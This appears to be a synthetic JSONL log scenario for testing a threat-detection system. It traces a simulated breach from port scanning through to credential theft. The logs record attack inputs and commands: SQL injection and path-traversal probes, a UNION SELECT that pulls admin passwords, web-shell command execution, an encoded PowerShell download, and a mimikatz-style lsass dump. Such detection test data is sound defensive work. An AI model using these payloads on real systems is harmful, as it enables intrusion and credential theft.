# AEGIS THREAT SCENARIO LOG FILE
# Scenario: APT-CORP-2026 — Multi-Stage Enterprise Breach
# Duration: ~4 hours of compressed attack activity
# Format: One JSON object per line (JSONL)
# Log types: Sysmon, Windows Event, Zeek conn/dns/http/ssl, Firewall

# === PHASE 0: BENIGN BASELINE (T+0 to T+300s) ===
# These are normal logs — should be stored but NOT queued for analysis

{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:00.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54000, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "microsoft.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:05.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54001, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "windows.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:10.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54002, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "office.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:15.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54003, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "google.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:20.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54004, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "github.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:25.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54005, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "amazonaws.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:30.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54006, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "cloudflare.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:35.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54007, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "akamai.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:40.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54008, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "cdn.jquery.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_dns", "_path": "dns", "timestamp": "2026-05-08T02:00:45.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 54009, "id.resp_h": "10.10.0.1", "id.resp_p": 53, "query": "fonts.googleapis.com", "qtype_name": "A", "answers": ["93.184.216.34"], "hostname": "WORKSTATION01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:00:50.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 55000, "id.resp_h": "52.96.1.1", "id.resp_p": 443, "method": "GET", "host": "office.com", "uri": "/index.html", "status_code": 200, "resp_mime_types": "text/html", "hostname": "WORKSTATION01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:01:00.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 55001, "id.resp_h": "52.96.1.1", "id.resp_p": 443, "method": "GET", "host": "office.com", "uri": "/api/status", "status_code": 200, "resp_mime_types": "text/html", "hostname": "WORKSTATION01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:01:10.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 55002, "id.resp_h": "52.96.1.1", "id.resp_p": 443, "method": "GET", "host": "office.com", "uri": "/favicon.ico", "status_code": 200, "resp_mime_types": "text/html", "hostname": "WORKSTATION01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:01:20.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 55003, "id.resp_h": "52.96.1.1", "id.resp_p": 443, "method": "GET", "host": "office.com", "uri": "/robots.txt", "status_code": 200, "resp_mime_types": "text/html", "hostname": "WORKSTATION01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:01:30.000Z", "id.orig_h": "10.10.1.50", "id.orig_p": 55004, "id.resp_h": "52.96.1.1", "id.resp_p": 443, "method": "GET", "host": "office.com", "uri": "/static/main.js", "status_code": 200, "resp_mime_types": "text/html", "hostname": "WORKSTATION01"}
{"source": "windows_event", "EventID": 4624, "timestamp": "2026-05-08T02:01:40.000Z", "SubjectUserName": "jdoe", "TargetUserName": "jdoe", "WorkstationName": "WORKSTATION01", "IpAddress": "10.10.1.50", "LogonType": "2", "hostname": "WORKSTATION01"}
{"source": "windows_event", "EventID": 4624, "timestamp": "2026-05-08T02:02:00.000Z", "SubjectUserName": "jdoe", "TargetUserName": "jdoe", "WorkstationName": "WORKSTATION01", "IpAddress": "10.10.1.50", "LogonType": "2", "hostname": "WORKSTATION01"}
{"source": "windows_event", "EventID": 4624, "timestamp": "2026-05-08T02:02:20.000Z", "SubjectUserName": "jdoe", "TargetUserName": "jdoe", "WorkstationName": "WORKSTATION01", "IpAddress": "10.10.1.50", "LogonType": "2", "hostname": "WORKSTATION01"}
{"source": "windows_event", "EventID": 4624, "timestamp": "2026-05-08T02:02:40.000Z", "SubjectUserName": "jdoe", "TargetUserName": "jdoe", "WorkstationName": "WORKSTATION01", "IpAddress": "10.10.1.50", "LogonType": "2", "hostname": "WORKSTATION01"}
{"source": "windows_event", "EventID": 4624, "timestamp": "2026-05-08T02:03:00.000Z", "SubjectUserName": "jdoe", "TargetUserName": "jdoe", "WorkstationName": "WORKSTATION01", "IpAddress": "10.10.1.50", "LogonType": "2", "hostname": "WORKSTATION01"}
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:03:20.000Z", "Image": "C:\\\\Windows\\\\explorer.exe", "ParentImage": "C:\\\\Windows\\\\winlogon.exe", "User": "CORP\\\\jdoe", "CommandLine": "explorer.exe", "ProcessId": "3000", "hostname": "WORKSTATION01"}
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:03:35.000Z", "Image": "C:\\\\Windows\\\\chrome.exe", "ParentImage": "C:\\\\Windows\\\\explorer.exe", "User": "CORP\\\\jdoe", "CommandLine": "chrome.exe", "ProcessId": "3001", "hostname": "WORKSTATION01"}
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:03:50.000Z", "Image": "C:\\\\Windows\\\\notepad.exe", "ParentImage": "C:\\\\Windows\\\\explorer.exe", "User": "CORP\\\\jdoe", "CommandLine": "notepad.exe", "ProcessId": "3002", "hostname": "WORKSTATION01"}
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:04:05.000Z", "Image": "C:\\\\Windows\\\\outlook.exe", "ParentImage": "C:\\\\Windows\\\\explorer.exe", "User": "CORP\\\\jdoe", "CommandLine": "outlook.exe", "ProcessId": "3003", "hostname": "WORKSTATION01"}
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:04:20.000Z", "Image": "C:\\\\Windows\\\\teams.exe", "ParentImage": "C:\\\\Windows\\\\explorer.exe", "User": "CORP\\\\jdoe", "CommandLine": "teams.exe", "ProcessId": "3004", "hostname": "WORKSTATION01"}
{"source": "firewall", "timestamp": "2026-05-08T02:03:40.000Z", "action": "ALLOW", "src_ip": "10.10.1.50", "dst_ip": "52.96.1.1", "src_port": "56000", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth0"}
{"source": "firewall", "timestamp": "2026-05-08T02:03:45.000Z", "action": "ALLOW", "src_ip": "10.10.1.50", "dst_ip": "52.96.1.1", "src_port": "56001", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth0"}
{"source": "firewall", "timestamp": "2026-05-08T02:03:50.000Z", "action": "ALLOW", "src_ip": "10.10.1.50", "dst_ip": "52.96.1.1", "src_port": "56002", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth0"}
{"source": "firewall", "timestamp": "2026-05-08T02:03:55.000Z", "action": "ALLOW", "src_ip": "10.10.1.50", "dst_ip": "52.96.1.1", "src_port": "56003", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth0"}
{"source": "firewall", "timestamp": "2026-05-08T02:04:00.000Z", "action": "ALLOW", "src_ip": "10.10.1.50", "dst_ip": "52.96.1.1", "src_port": "56004", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth0"}
{"source": "firewall", "timestamp": "2026-05-08T02:04:05.000Z", "action": "ALLOW", "src_ip": "10.10.1.50", "dst_ip": "52.96.1.1", "src_port": "56005", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth0"}
{"source": "firewall", "timestamp": "2026-05-08T02:04:10.000Z", "action": "ALLOW", "src_ip": "10.10.1.50", "dst_ip": "52.96.1.1", "src_port": "56006", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth0"}
{"source": "firewall", "timestamp": "2026-05-08T02:04:15.000Z", "action": "ALLOW", "src_ip": "10.10.1.50", "dst_ip": "52.96.1.1", "src_port": "56007", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth0"}

# === PHASE 1: RECONNAISSANCE (T+300 to T+600s) ===
{"source": "firewall", "timestamp": "2026-05-08T02:05:00.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45000", "dst_port": "21", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:03.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45001", "dst_port": "22", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:06.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45002", "dst_port": "23", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:09.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45003", "dst_port": "25", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:12.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45004", "dst_port": "53", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:15.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45005", "dst_port": "80", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:18.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45006", "dst_port": "110", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:21.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45007", "dst_port": "135", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:24.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45008", "dst_port": "139", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:27.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45009", "dst_port": "143", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:30.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45010", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:33.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45011", "dst_port": "445", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:36.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45012", "dst_port": "993", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:39.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45013", "dst_port": "995", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:42.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45014", "dst_port": "1433", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:45.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45015", "dst_port": "1521", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:48.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45016", "dst_port": "3306", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:51.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45017", "dst_port": "3389", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:54.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45018", "dst_port": "5432", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:05:57.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45019", "dst_port": "5900", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:06:00.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45020", "dst_port": "6379", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:06:03.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45021", "dst_port": "8080", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:06:06.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45022", "dst_port": "8443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:06:09.000Z", "action": "DENY", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "45023", "dst_port": "27017", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "BLOCK_INBOUND_UNTRUSTED"}
{"source": "firewall", "timestamp": "2026-05-08T02:06:15.000Z", "action": "ALLOW", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "44321", "dst_port": "80", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1"}
{"source": "firewall", "timestamp": "2026-05-08T02:06:16.000Z", "action": "ALLOW", "src_ip": "203.0.113.77", "dst_ip": "10.10.2.10", "src_port": "44322", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:06:20.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44400", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/", "status_code": 200, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:06:28.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44401", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/.git/config", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:06:36.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44402", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/wp-admin/", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:06:44.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44403", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/admin/", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:06:52.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44404", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/phpmyadmin/", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:07:00.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44405", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/manager/html", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:07:08.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44406", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/api/v1/users", "status_code": 200, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:07:16.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44407", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/../../../etc/passwd", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:07:24.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44408", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/upload.php", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:07:32.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44409", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/shell.php", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:07:40.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44410", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/backup.zip", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:07:48.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44411", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/config.php.bak", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:07:56.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44412", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/?id=1'%20OR%20'1'='1", "status_code": 200, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:08:04.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44413", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/?search=<script>alert(1)</script>", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:08:12.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44414", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/api/v2/admin?debug=true", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:08:20.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44415", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/actuator/env", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:08:28.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44416", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/actuator/heapdump", "status_code": 404, "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:08:50.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44500", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/api/v1/users?id=1%20UNION%20SELECT%20username,password,3%20FROM%20admin_users--", "status_code": 200, "response_body_len": 4821, "user_agent": "sqlmap/1.7.8#stable", "hostname": "WEBSERVER01"}
{"source": "zeek_ssl", "_path": "ssl", "timestamp": "2026-05-08T02:09:10.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44600", "id.resp_h": "10.10.2.10", "id.resp_p": "443", "version": "TLSv12", "cipher": "TLS_RSA_WITH_AES_256_CBC_SHA", "server_name": "corp-portal.example.com", "established": true, "hostname": "WEBSERVER01"}

# === PHASE 2: INITIAL ACCESS — Web Shell Upload (T+600 to T+800s) ===
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:10:00.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44700", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "POST", "host": "corp-portal.example.com", "uri": "/api/v1/upload", "request_body_len": 8192, "status_code": 200, "user_agent": "Mozilla/5.0 (compatible; exploit/1.0)", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 11, "timestamp": "2026-05-08T02:10:15.000Z", "Image": "C:\\\\xampp\\\\apache\\\\bin\\\\httpd.exe", "TargetFilename": "C:\\\\xampp\\\\htdocs\\\\uploads\\\\d3adb33f.php", "CreationUtcTime": "2026-05-08T02:10:15.000Z", "User": "NETWORK SERVICE", "ProcessId": "2412", "hostname": "WEBSERVER01"}
{"source": "zeek_http", "_path": "http", "timestamp": "2026-05-08T02:10:25.000Z", "id.orig_h": "203.0.113.77", "id.orig_p": "44750", "id.resp_h": "10.10.2.10", "id.resp_p": "80", "method": "GET", "host": "corp-portal.example.com", "uri": "/uploads/d3adb33f.php?cmd=whoami", "status_code": 200, "response_body_len": 22, "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:10:30.000Z", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ParentImage": "C:\\\\xampp\\\\apache\\\\bin\\\\httpd.exe", "ParentCommandLine": "httpd.exe -k runservice", "CommandLine": "cmd.exe /c whoami", "User": "NETWORK SERVICE", "ProcessId": "5841", "ParentProcessId": "2412", "hostname": "WEBSERVER01"}

# === PHASE 3: PRIVILEGE ESCALATION (T+800 to T+1100s) ===
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:13:20.000Z", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "CommandLine": "powershell.exe -NoProfile -EncodedCommand SQBFAFgA", "User": "NETWORK SERVICE", "ProcessId": "6001", "ParentProcessId": "5841", "hostname": "WEBSERVER01"}
{"source": "zeek_conn", "_path": "conn", "timestamp": "2026-05-08T02:13:25.000Z", "id.orig_h": "10.10.2.10", "id.orig_p": "49800", "id.resp_h": "185.220.101.45", "id.resp_p": "443", "proto": "tcp", "service": "ssl", "orig_bytes": 512, "resp_bytes": 204800, "conn_state": "SF", "duration": 12.4, "hostname": "WEBSERVER01"}
{"source": "firewall", "timestamp": "2026-05-08T02:13:25.000Z", "action": "ALLOW", "src_ip": "10.10.2.10", "dst_ip": "185.220.101.45", "src_port": "49800", "dst_port": "443", "protocol": "TCP", "hostname": "FW-CORP-01", "interface": "eth1", "rule": "ALLOW_OUTBOUND_WEB"}
{"source": "sysmon", "EventID": 11, "timestamp": "2026-05-08T02:13:40.000Z", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "TargetFilename": "C:\\\\Windows\\\\Temp\\\\svc_patch.exe", "CreationUtcTime": "2026-05-08T02:13:40.000Z", "User": "NETWORK SERVICE", "ProcessId": "6001", "hostname": "WEBSERVER01"}
{"source": "windows_event", "EventID": 4672, "timestamp": "2026-05-08T02:13:55.000Z", "SubjectUserName": "SYSTEM", "SubjectUserSid": "S-1-5-18", "PrivilegeList": "SeAssignPrimaryTokenPrivilege,SeTcbPrivilege,SeSecurityPrivilege", "hostname": "WEBSERVER01"}

# === PHASE 4: CREDENTIAL DUMPING (T+1100 to T+1400s) ===
{"source": "sysmon", "EventID": 1, "timestamp": "2026-05-08T02:18:20.000Z", "Image": "C:\\\\Windows\\\\Temp\\\\m64.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "CommandLine": "m64.exe privilege::debug sekurlsa::logonpasswords", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "7001", "ParentProcessId": "6200", "hostname": "WEBSERVER01"}
{"source": "sysmon", "EventID": 10, "timestamp": "2026-05-08T02:18:30.000Z", "SourceImage": "C:\\\\Windows\\\\Temp\\\\m64.exe", "TargetImage": "C:\\\\Windows\\\\System32\\\\lsass.exe", "TargetPid": "824", "GrantedAccess": "0x1010", "User": "NT AUTHORITY\\\\SYSTEM", "ProcessId": "7001", "hostname": "WEBSERVER01"}
{"source": "windows_event", "EventID": 4656, "timestamp": "2026-05-08T02:18:31.000Z", "SubjectUserName": "SYSTEM", "ObjectName": "\\\\Device\\\\HarddiskVolume3\\\\Windows\\\\System32\\\\lsass.exe", "AccessMask": "0x143A", "ProcessName": "C:\\\\Windows\\\\Temp\\\\m64.exe", "hostname": "WEBSERVER01"}
